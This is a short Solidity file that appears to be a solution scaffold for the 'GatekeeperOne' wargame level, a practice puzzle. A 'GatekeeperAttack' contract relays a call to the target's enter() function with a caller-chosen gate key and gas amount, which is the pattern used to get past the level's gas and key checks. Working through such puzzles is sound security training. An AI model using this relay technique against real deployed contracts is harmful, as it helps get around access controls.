pragma solidity ^0.8.10;

interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperAttack {
    function attack(address _address, bytes8 _gateKey, uint64 _gas) external {
        GatekeeperOne(_address).enter{ gas: _gas }(_gateKey);
    }
}